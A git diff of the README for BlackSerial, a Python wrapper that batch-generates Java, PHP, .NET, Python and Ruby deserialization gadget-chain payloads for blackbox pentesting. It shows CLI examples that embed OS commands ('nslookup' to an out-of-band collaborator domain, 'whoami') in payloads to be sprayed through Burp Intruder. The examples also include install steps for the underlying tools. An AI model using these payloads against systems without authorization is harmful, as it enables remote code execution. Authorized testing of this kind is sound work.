@@ -1,27 +1,28 @@
 # BlackSerial
 
-A Blackbox Gadget Chain Serializer for Java ([YSOSerial](https://github.com/frohoff/ysoserial)), PHP ([PHPGGC](https://github.com/ambionics/phpggc)), Python ([Pickle](https://docs.python.org/3/library/pickle.html)), C#/.Net ([YSOSerial\.Net](https://github.com/pwntester/ysoserial)).
+A **Blackbox pentesting Gadget Chain Serializer** for Java ([YSOSerial](https://github.com/frohoff/ysoserial)), PHP ([PHPGGC](https://github.com/ambionics/phpggc)), Python ([Pickle](https://docs.python.org/3/library/pickle.html)), C#/.Net ([YSOSerial\.Net](https://github.com/pwntester/ysoserial)), Ruby ([GitHubSecurityLab/ruby-unsafe-deserialization](https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/)).
 
 BlackSerial is a python wrapper for different gadget chain serializers. It is designed to be used during Blackbox pentesting or Bugbounty where you suspect a deserialisation user input but you don't have the code to identify or craft a gadget chain.
 
-Its first objective is to identify working gadget chain on a blackbox code base via out of band interact/collaborator dns callback, not to do the full exploitation. You can detect the good gadget chain by putting `%%chain_id%%` in your payload for instance. Then use directly the serializer.
+Its first objective is not to make the full RCE exploitation, but only to identify working gadget chain on a blackbox code base. **It prioritizes out of band interact/collaborator dns callback**. You can detect the good gadget chain by putting `%%chain_id%%` in your payload for instance. Then use directly the serializer.
 
-It attempts to generate all possible chains, managing the burden of providing different input formats and options, and output the results in a file that can be used in Burp Intruder for instance.
+It attempts to generate all possible chains, managing the 🤯 **burden of the different chains input formats** 🤯 and tools. You may have experienced it if you tried to write a simple bash script to iterate over all the gadget chains supported by the tool. It outputs the results in a file so it can be used directly in Burp Intruder for instance.
 
-It provides no new technique.
+This tool implement or invent no new technique. It is just a mashup of different tools.
 
 ## Features
 
 * Generates around 200 gadget chains in a "best effort" approach with default options and all possible formatters
-* Supported serializers: PHPGGC (PHP), YSOSerial (Java), YSOSerial.Net (C# .Net), Pickle (Python)
-* Out of band execution detection first
+* Supported serializers: PHPGGC (PHP), YSOSerial (Java), YSOSerial\.Net (C# .Net), Pickle (Python), Ruby (GitHubSecurityLab/ruby-unsafe-deserialization)
+* Out of band execution detection first with DNS callback to `<chain_id>.<interact_domain>`, like `oj-detection-ruby-3.3.ctj7qmhpf81f7c6r97s0js9ea8i9xkjwp.oast.online`
 * Standardized cli interface for all serializers
-* Supported encodings: Base64 `-b`, URL `-u`, or Base64 URL safe `-ub`
+* Supported encodings: Base64 `-b`, URL `-u`, Base64 URL safe `-ub`, Hex string `-x`
 * Isolates unsafe gadgets that delete files with `--unsafe` option
-* Can generates all payloads in 1 file or 1 file per payload with `-o1` in the format `<chain_name>.txt`
-* Can generates 1 named gadget chain
+* Can generates all payloads in 1 file and remove line feed `\n` of non binary chains (json, yaml, xml) when put in 1 file
+* Can generate 1 file by payload with `-o1` in the format `<chain_name>.txt`. Usefull when you have non binary gadget chains like json, yaml, xml
+* Can generates 1 gadget chain only by its name
 * Add custom serializers options with `--phpggc-options`, `--ysoserial-options` and `--ysoserial-net-options`
-* Provides 5 custom pickle byte-code (it's not really a chain for pickle)
+* Provides 5 custom pickle byte-code (it's not really a chain for pickle, more direct byte-code)
 
 Note: a similar project exists but for ysoserial only and do not work for all payloads: https://github.com/aludermin/ysoserial-wrapper
 
@@ -32,14 +33,14 @@ List all supported gadget chains:
 python3 blackserial.py -s all -l
 ```
 
-Generates PHP payloads base64 encoded into `payloads.txt` (default output file) with `nslookup %%domain%%` system command (default command):
+Generates PHP payloads base64 encoded into `payloads.txt` (default output file) with `nslookup %chain_id%.%%domain%%` system command (default command):
 ```
 python3 blackserial.py -s php -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -b
 ```
 
-Same with Java but URL encoded:
+Same with Java but URL encoded and a custom command:
 ```
-python3 blackserial.py -s java -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -u
+python3 blackserial.py -s java -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -u -c "whoami"
 ```
 
 Same with Python but Base64 urlsafe:
@@ -47,9 +48,14 @@ Same with Python but Base64 urlsafe:
 python3 blackserial.py -s python -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -bu
 ```
 
-Same with C#:
+Same with C# with 1 file by payload:
 ```
-python3 blackserial.py -s csharp -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -bu
+python3 blackserial.py -s csharp -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -bu  -o1 --output ./payloads-dir/
+```
+
+An example with ruby:
+```
+python3 blackserial.py -s ruby -i ddumqtbjx6q509qib6tiuiyds4yvmlaa.oastify.com -b
 ```
 
 ## Advanced examples
@@ -91,11 +97,12 @@ TODO
 
 ## Manual install
 
-Offline installation is possible with required dependencies in the `./archives` directory.
+Offline installation of dependencies are provided in the `./archives` directory. Git repository are not provided.
 
 ### phpggc
 
 ```
+cd bin
 git clone https://github.com/ambionics/phpggc
 ```
 
@@ -103,6 +110,7 @@ git clone https://github.com/ambionics/phpggc
 
 Install JRE8 in a local directory:
 ```
+cd bin
 wget "https://javadl.oracle.com/webapps/download/AutoDL?BundleId=251398_0d8f12bc927a4e2c9f8568ca567db4ee" -O jre-8u431-linux-x64.tar.gz
 tar -xzf jre-8u431-linux-x64.tar.gz
 ```
@@ -133,11 +141,18 @@ winetricks nocrashdialog
 
 Download last release from officiel repo: https://github.com/pwntester/ysoserial.net/releases
 
-Unzip it.
+Unzip it in `bin` directory.
 
 Make a unit test to see if everything is ok:
 ```
-wine ./Release/ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "ping 127.0.0.1"
+wine ./bin/Release/ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "ping 127.0.0.1"
+```
+
+### ruby
+
+```
+cd bin
+git clone https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/
 ```
 
 ## FAQ / known issues
@@ -166,6 +181,7 @@ Under linux, blackserial uses wine to launch ysoserial.exe and thus it is slow. 
 * ruby
 * manage phar
 * docker
+* https://pyro4.readthedocs.io/en/stable/api/util.html
 
 
 ## ⚠️ WARNING: LEGAL DISCLAIMER
